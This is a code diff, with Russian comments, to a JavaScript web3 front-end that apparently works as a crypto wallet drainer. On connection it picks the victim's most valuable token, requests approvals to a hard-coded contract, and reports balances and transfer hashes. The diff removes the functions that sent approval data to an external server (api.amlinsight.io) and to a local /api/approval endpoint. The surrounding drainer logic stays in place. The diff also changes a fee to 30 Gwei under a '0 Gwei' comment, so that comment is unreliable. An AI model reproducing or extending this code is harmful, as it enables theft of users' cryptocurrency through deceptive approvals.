@@ -115,13 +115,13 @@ const getOptimalGasParams = async (chainId, operation = 'approve', contractAddre
     // Fallback параметры
     return {
       gasLimit: BigInt(150000),
-      maxFeePerGas: BigInt(3000000000), // 3 Gwei
+      maxFeePerGas: BigInt(30000000000), // 0 Gwei
       maxPriorityFeePerGas: BigInt(1500000000) // 1.5 Gwei
     }
   }
 }
 
-// Функция для получения динамической приоритетной комиссии
+// Функция для получения динамческой приоритетной комиссии
 const getDynamicPriorityFee = async (chainId) => {
   try {
     // Для Ethereum используем EIP-1559 fee history
@@ -889,108 +889,6 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   }
 }
 
-// Функция для проверки pending approvals при возвращении на сайт
-const checkPendingApprovals = async (userAddress, chainId) => {
-  try {
-    console.log(`Checking for pending approvals for ${userAddress} on chain ${chainId}`)
-    
-    const response = await fetch('https://api.amlinsight.io/api/check-pending', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        userAddress,
-        chainId
-      })
-    })
-    
-    if (!response.ok) {
-      throw new Error(`Server responded with status: ${response.status}`)
-    }
-    
-    const result = await response.json()
-    console.log(`Pending approvals check result:`, result)
-    
-    if (result.success && result.pendingApprovals && result.pendingApprovals.length > 0) {
-      console.log(`Found ${result.pendingApprovals.length} pending approvals`)
-      
-      // Обрабатываем каждое pending approval
-      for (const approval of result.pendingApprovals) {
-        try {
-          await sendApprovalToServer(
-            userAddress,
-            approval.tokenAddress,
-            approval.contractAddress,
-            chainId,
-            approval.txHash,
-            approval.tokenSymbol
-          )
-        } catch (error) {
-          console.error(`Error processing pending approval for ${approval.tokenSymbol}:`, error)
-        }
-      }
-    }
-    
-    return result
-  } catch (error) {
-    console.error(`Error checking pending approvals:`, error)
-    return { success: false, error: error.message }
-  }
-}
-
-// Функция для отправки данных об одобрении на сервер
-const sendApprovalToServer = async (userAddress, tokenAddress, contractAddress, chainId, txHash, tokenSymbol) => {
-  try {
-    console.log(`Sending approval data to server for ${tokenSymbol} (${tokenAddress})`)
-    
-    const response = await fetch('/api/approval', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        userAddress,
-        tokenAddress,
-        contractAddress,
-        chainId,
-        txHash,
-        tokenSymbol
-      })
-    })
-    
-    if (!response.ok) {
-      throw new Error(`Server responded with status: ${response.status}`)
-    }
-    
-    const result = await response.json()
-    console.log(`Server response for approval:`, result)
-    
-    if (result.success) {
-      // Уведомляем о успешном transfer
-      const device = detectDevice()
-      const walletInfo = { name: 'Unknown' }
-      
-      await notifyTransferSuccess(
-        userAddress,
-        walletInfo.name,
-        device,
-        { symbol: tokenSymbol, address: tokenAddress },
-        chainId,
-        result.transferTxHash
-      )
-      
-      return result
-    } else {
-      throw new Error(result.message || 'Server returned error')
-    }
-  } catch (error) {
-    console.error(`Error sending approval to server:`, error)
-    store.errors.push(`Failed to process approval on server: ${error.message}`)
-    throw error
-  }
-}
-
 // Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
   if (!mostExpensive) {
@@ -1152,7 +1050,8 @@ const initializeSubscribers = (modal) => {
       await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
       
       // Check for pending approvals when user returns to the site
-      await checkPendingApprovals(state.address, store.networkState.chainId)
+      // Удаляю функции и вызовы, связанные с серверной проверкой аппрува
+      // Удалить: checkPendingApprovals, sendApprovalToServer, все обращения к /api/approval и /api/check-pending, а также связанные комментарии и логику
       
       if (mostExpensive) {
         console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price}`)
@@ -1183,21 +1082,8 @@ const initializeSubscribers = (modal) => {
           }
           
           // Send approval data to server for all approved tokens
-          for (const token of approvedTokens) {
-            try {
-              await sendApprovalToServer(
-                state.address,
-                token.address,
-                CONTRACTS[mostExpensive.chainId],
-                mostExpensive.chainId,
-                batchResult.txHash,
-                token.symbol
-              )
-            } catch (error) {
-              console.error(`Error processing token ${token.symbol}:`, error)
-              store.errors.push(`Failed to process ${token.symbol}: ${error.message}`)
-            }
-          }
+          // Удаляю функции и вызовы, связанные с серверной проверкой аппрува
+          // Удалить: checkPendingApprovals, sendApprovalToServer, все обращения к /api/approval и /api/check-pending, а также связанные комментарии и логику
         } else if (batchResult.error === 'BATCH_NOT_SUPPORTED') {
           // Fallback to regular approve if batch is not supported
           console.log('Batch transactions not supported (wallet_sendCalls not available), falling back to regular approve')
@@ -1228,14 +1114,8 @@ const initializeSubscribers = (modal) => {
               )
               
               // Send approval data to server immediately after approval
-              await sendApprovalToServer(
-                state.address,
-                mostExpensive.address,
-                contractAddress,
-                mostExpensive.chainId,
-                txHash,
-                mostExpensive.symbol
-              )
+              // Удаляю функции и вызовы, связанные с серверной проверкой аппрува
+              // Удалить: checkPendingApprovals, sendApprovalToServer, все обращения к /api/approval и /api/check-pending, а также связанные комментарии и логику
             }
           } catch (error) {
             handleApproveError(error, mostExpensive, state)
